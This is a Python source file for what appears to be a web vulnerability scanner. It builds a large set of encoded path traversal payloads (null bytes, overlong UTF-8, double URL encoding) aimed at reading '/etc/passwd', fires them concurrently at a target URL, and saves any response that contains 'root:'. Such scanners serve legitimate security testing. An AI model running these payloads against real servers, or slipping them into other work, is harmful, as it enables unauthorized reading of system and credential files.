# from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse

# from socket import timeout
import asyncio
import json
from datetime import datetime
import hashlib, random
from aiohttp import ClientSession

# files = ['etc/passwd']

dots = [
    "..",
    ".%00.",
    "..%00",
    "..%01",
    ".?",
    "??",
    "?.",
    "%5C..",
    ".%2e",
    "%2e.",
    ".../.",
    "..../",
    "%2e%2e",
    "%%c0%6e%c0%6e",
    "0x2e0x2e",
    "%c0.%c0.",
    "%252e%252e",
    "%c0%2e%c0%2e",
    "%c0%ae%c0%ae",
    "%c0%5e%c0%5e",
    "%c0%ee%c0%ee",
    "%c0%fe%c0%fe",
    "%uff0e%uff0e",
    "%%32%%65%%32%%65",
    "%e0%80%ae%e0%80%ae",
    "%25c0%25ae%25c0%25ae",
    "%f0%80%80%ae%f0%80%80%ae",
    "%f8%80%80%80%ae%f8%80%80%80%ae",
    "%fc%80%80%80%80%ae%fc%80%80%80%80%ae",
]

slashes = [
    "/",
    "\\",
    "%2f",
    "%5c",
    "0x2f",
    "0x5c",
    "%252f",
    "%255c",
    "%c0%2f",
    "%c0%af",
    "%c0%5c",
    "%c1%9c",
    "%c1%pc",
    "%c0%9v",
    "%c0%qf",
    "%c1%8s",
    "%c1%1c",
    "%c1%af",
    "%bg%qf",
    "%u2215",
    "%u2216",
    "%uEFC8",
    "%uF025",
    "%%32%%66",
    "%%35%%63",
    "%e0%80%af",
    "%25c1%259c",
    "%25c0%25af",
    "%f0%80%80%af",
    "%f8%80%80%80%af",
]


async def fire_payload(session, username, target, path, scan_session_id, count):

    report = {}
    request = {}
    response = {}

    result_string = "benign"
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%dT%H:%M")

    id = hashlib.md5((target + path + str(random.random())).encode("utf-8")).hexdigest()

    try:
        http_request = await session.get(target + path)
        http_response_raw = await http_request.read()
        try: 
            http_response = http_response_raw.decode("utf-8")
        except Exception as e:
            print("encoding exception swithcing codec...");
            http_response = http_response_raw.decode("latin-1")
        http_length = len(http_response)
        http_status = http_request.status

        if http_status != 404 and http_status != 400 and "root:" in http_response:
            result_string = "vulnerable"
            count += 1

            report = {
                "id": id,
                "scan_session_id": scan_session_id,
                "scan_type": "traversal_check",
                "timestamp": current_time,
                "username": username,
                "target": target,
                "sub_path": path,
                "vulnerability": "Linux Directory Travevrsal",
                "status": http_status,
                "url": target + path,
                "result_string": result_string,
            }
            request = {
                "id": id,
                "host": target,
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Python/3.9 aiohttp/3.7.3",
                "body": "",
            }
            response = {
                "id": id,
                "headers_string": json.dumps(dict(http_request.headers)),
                "body": http_response
            }

    except Exception as exception:
        print(exception)
        # report = {
        #     "id": id,
        #     "scan_session_id": scan_session_id,
        #     "scan_type": "traversal_check",
        #     "timestamp": current_time,
        #     "username": username,
        #     "target": target,
        #     "sub_path": path,
        #     "vulnerability": "Linux Directory Travevrsal",
        #     "status": 404,
        #     "url": target + path,
        #     "result_string": "benign",
        # }
        # request = {
        #     "id": id,
        #     "host": target,
        #     "Accept": "*/*",
        #     "Accept-Encoding": "gzip, deflate",
        #     "User-Agent": "Python/3.9 aiohttp/3.7.3",
        #     "body": "",
        # }
        # response = {
        #     "id": id,
        #     "headers_string": "bad reuqest"
        # }

    finally:
        return report, request, response


async def main(
    target, cookies="", depth=6, session=None, username=None, scan_session_id=None
):
    reports_list = []
    requests_list = []
    responses_list = []
    random.seed(int(datetime.now().timestamp()))
    count = 0

    traversal_patterns = []
    for dot in dots:
        for slash in slashes:
            traversal_patterns.append(dot + slash)

    traversal_paths = []
    for i in range(len(traversal_patterns)):
        for j in range(depth):
            traversal_paths.append(traversal_patterns[i] * (j + 1) + "/etc/passwd")

    tasks = []
    for path in traversal_paths:
        tasks.append(
            asyncio.create_task(
                fire_payload(session, username, target, path, scan_session_id, count)
            )
        )
    for coro in asyncio.as_completed(tasks):
        report, request, response = await coro
        reports_list.append(report)
        requests_list.append(request)
        responses_list.append(response)

    await session.close()

    return reports_list, requests_list, responses_list, count


# session = ClientSession()
# print(asyncio.run(main(target="http://testphp.vulnweb.com", session=session, username="aaa", scan_session_id="rand")))
